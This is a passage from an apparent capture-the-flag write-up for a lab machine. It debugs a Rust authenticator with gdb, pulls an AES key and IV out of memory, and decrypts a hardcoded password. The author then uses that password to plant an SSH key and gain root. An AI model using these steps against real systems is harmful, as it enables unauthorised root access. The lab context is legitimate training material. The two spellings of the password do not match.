   0x55555555b940 <_ZN14authentication4main17h453271f02403abafE+416>:   mov    QWORD PTR [rsp+0x8],rdx
   0x55555555b945 <_ZN14authentication4main17h453271f02403abafE+421>:   mov    r14,QWORD PTR [rsp+0x68]
   0x55555555b94a <_ZN14authentication4main17h453271f02403abafE+426>:   mov    QWORD PTR [rsp+0x40],0x1
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x7fffffffdb10 --> 0x6191795c3432e8a3 
arg[2]: 0x10 
arg[3]: 0x7fffffffdb20 --> 0x9a95d2d9e3591f76 
arg[4]: 0x10 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd9b0 --> 0x0 
0008| 0x7fffffffd9b8 --> 0x0 
0016| 0x7fffffffd9c0 --> 0x5555555b4208 --> 0x5555555b5a10 --> 0x0 
0024| 0x7fffffffd9c8 --> 0x0 
0032| 0x7fffffffd9d0 --> 0x0 
0040| 0x7fffffffd9d8 --> 0x0 
0048| 0x7fffffffd9e0 --> 0x0 
0056| 0x7fffffffd9e8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x000055555555b936 in authentication::main ()

```

When initializing a crypto object, typically it needs a key and an IV. `arg[1]` and `arg[3]` could be that, with `arg[2]` and `arg[4]` being the lengths of each.

I can grab them by printing 32-bytes (the iv immediately follows the key in memory):

```

gdb-peda$ x/32xb 0x7fffffffdb10
0x7fffffffdb10: 0xa3    0xe8    0x32    0x34    0x5c    0x79    0x91    0x61
0x7fffffffdb18: 0x9e    0x20    0xd4    0x3d    0xbe    0xf4    0xf5    0xd5
0x7fffffffdb20: 0x76    0x1f    0x59    0xe3    0xd9    0xd2    0x95    0x9a
0x7fffffffdb28: 0xa7    0x98    0x55    0xdc    0x06    0x20    0x81    0x6a

```

`c` to continue to the next break, where it looked like it was using the crypto object to encrypt:

console?prompt=peda$&output=peda

```

[----------------------------------registers-----------------------------------]
RAX: 0x5555555b7d20 --> 0x0 
RBX: 0xc ('\x0c')
RCX: 0x5555555b7d20 --> 0x0 
RDX: 0xc ('\x0c')
RSI: 0x5555555b7b50 ("0xdfpassword\n")
RDI: 0x7fffffffd9b0 --> 0x5555555b7be0 --> 0x5555555b7ba0 --> 0x9a95d2d9e3591f76 
RBP: 0x55555559d850 (<__libc_csu_init>: push   r15)
RSP: 0x7fffffffd9b0 --> 0x5555555b7be0 --> 0x5555555b7ba0 --> 0x9a95d2d9e3591f76 
RIP: 0x55555555b9a6 (<_ZN14authentication4main17h453271f02403abafE+518>:        call   QWORD PTR [rip+0x584d4]        # 0x5555555b3e80)
R8 : 0xc ('\x0c')
R9 : 0x7ffff7f84be0 --> 0x5555555b7d30 --> 0x0 
R10: 0x8080808080808080 
R11: 0x20 (' ')
R12: 0x55555559e050 ("assertion failed: self.is_char_boundary(new_len)/usr/src/rustc-1.48.0/library/alloc/src/string.rsYou have successfully authenticated\nEnter your SSH public key in now:\nFailed to read input!src/main.rse"...)
R13: 0x0 
R14: 0xc ('\x0c')
R15: 0x5555555b7b70 --> 0xca976a80f0251bfe
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555b99b <_ZN14authentication4main17h453271f02403abafE+507>:   mov    rcx,QWORD PTR [rsp+0x40]
   0x55555555b9a0 <_ZN14authentication4main17h453271f02403abafE+512>:   mov    rdi,rsp
   0x55555555b9a3 <_ZN14authentication4main17h453271f02403abafE+515>:   mov    r8,rbx
=> 0x55555555b9a6 <_ZN14authentication4main17h453271f02403abafE+518>:   call   QWORD PTR [rip+0x584d4]        # 0x5555555b3e80
   0x55555555b9ac <_ZN14authentication4main17h453271f02403abafE+524>:   cmp    QWORD PTR [rsp+0x50],0x20
   0x55555555b9b2 <_ZN14authentication4main17h453271f02403abafE+530>:   jne    0x55555555b9e9 <_ZN14authentication4main17h453271f02403abafE+585>
   0x55555555b9b4 <_ZN14authentication4main17h453271f02403abafE+532>:   mov    rax,QWORD PTR [rsp+0x40]
   0x55555555b9b9 <_ZN14authentication4main17h453271f02403abafE+537>:   cmp    rax,r15
Guessed arguments:
arg[0]: 0x7fffffffd9b0 --> 0x5555555b7be0 --> 0x5555555b7ba0 --> 0x9a95d2d9e3591f76 
arg[1]: 0x5555555b7b50 ("0xdfpassword\n")
arg[2]: 0xc ('\x0c')
arg[3]: 0x5555555b7d20 --> 0x0 
arg[4]: 0xc ('\x0c')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd9b0 --> 0x5555555b7be0 --> 0x5555555b7ba0 --> 0x9a95d2d9e3591f76 
0008| 0x7fffffffd9b8 --> 0x5555555b0ae8 --> 0x55555555c6a0 (<_ZN4core3ptr13drop_in_place17h268f9816975da054E>:  push   rbx)
0016| 0x7fffffffd9c0 --> 0x5555555b4208 --> 0x5555555b5a10 --> 0x0 
0024| 0x7fffffffd9c8 --> 0x0 
0032| 0x7fffffffd9d0 --> 0x0 
0040| 0x7fffffffd9d8 --> 0x0 
0048| 0x7fffffffd9e0 --> 0x0 
0056| 0x7fffffffd9e8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x000055555555b9a6 in authentication::main ()

```

`arg[1]` is the input I passed in, and `arg[3]` will hold the result. In CTR mode, the output length will be the same as the input length.

To check this decryption theory, I’ll use [CyberChef](https://gchq.github.io/CyberChef). It works:

![image-20210716095644871](https://0xdfimages.gitlab.io/img/image-20210716095644871.png)

The password is “RustForSecurity@Developer2021:)”.

### SSH

With the password, I’ll run the program with `sudo`, and it asks for my public key:

```

karl@developer:~$ sudo /root/.auth/authenticator 
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user: 
RustForSecurity@Developer@2021:)
You have successfully authenticated
Enter your SSH public key in now:
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
You may now authenticate as root!

```

On entering it, the program says I’m authenticated. And my key works:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.11.103
...[snip]...
root@developer:~# 

```

And I can grab the flag:

```

root@developer:~# cat root.txt
999061a9************************

```